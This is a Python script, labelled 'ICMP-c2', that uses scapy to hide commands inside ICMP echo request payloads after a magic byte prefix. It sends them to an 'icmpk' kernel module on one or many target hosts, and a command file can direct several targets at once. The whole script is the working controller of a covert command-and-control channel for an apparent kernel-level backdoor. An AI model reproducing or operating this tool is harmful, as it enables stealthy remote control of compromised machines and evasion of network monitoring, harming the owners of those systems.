#!/usr/bin/python3
from scapy.all import IP, ICMP, Raw, sr1, send
from os import popen
from sys import argv
import threading
from time import sleep
import argparse

def send_command_to_device(ip, command, verbose=False):
    pkt = IP(dst=ip) /\
        ICMP(type=8) /\
        Raw(load=b"\x70\x95\x05"+bytes(command, 'ascii'))
    send(pkt, verbose=verbose)
    # res = sr1(pkt, verbose=False)
    # return res[Raw].load

if __name__ == "__main__":
    # Initialize the parser
    parser = argparse.ArgumentParser(
        prog='ICMP-c2',
        description='Sends a command to the icmpk kernel module',
        epilog='Text at the bottom of help'
    )

    # Define arguments
    parser.add_argument(
        'inputs', nargs='*', metavar='IP/COMMAND',
        help="Specify IP followed by command (e.g., 192.168.1.1 ping)"
    )
    parser.add_argument(
        '-f', '--filename', metavar='FILE',
        help="Specify a file containing commands"
    )
    parser.add_argument('-v', '--verbose', action='store_true', help="Enable verbose output")

    # Parse the arguments
    args = parser.parse_args()

    # Validate mutual exclusivity manually
    if args.filename and args.inputs:
        parser.error("You cannot specify both an IP/command and a filename.")

    filename = None
    ip = None
    command = None

    if args.filename:
        print(f"Using file: {args.filename}, Verbose: {args.verbose}")
        with open(args.filename, 'r') as f:
            header, *commands = f.read().splitlines()
            targets = header.split()
            number_of_commands = len(commands)

        print(f"Targets: {', '.join(targets)}")
        for i, command in enumerate(commands):
            print(f"Command {i+1}: \"{command}\"")
        print()
        print()

        for ip in targets:
            print(f"Current target: {ip}")
            for i, command in enumerate(commands):
                print(f"\tCommand {i+1}/{number_of_commands}: \"{command}\"")
                send_command_to_device(ip, command, verbose=args.verbose)
            print()
    else:
        if len(args.inputs) >= 2:
            ip, command = args.inputs[0], ' '.join(args.inputs[1:])
            print(f"Using IP: {ip}, Command: {command}, Verbose: {args.verbose}")

            send_command_to_device(ip, command, verbose=args.verbose)
        else:
            parser.error("You must provide both an IP and a command.")


    # if(len(argv) < 3):
    #     print(f"Usage: {argv[0]} <IP> <command>")
    #     quit()
    # if 
    # ip = argv[1]
    # command = " ".join(argv[2:])
    # print("ip:", ip)
    # print("cmd:", command)
    # print("Output:")
    # print(send_command_to_device_and_get_output(ip, command))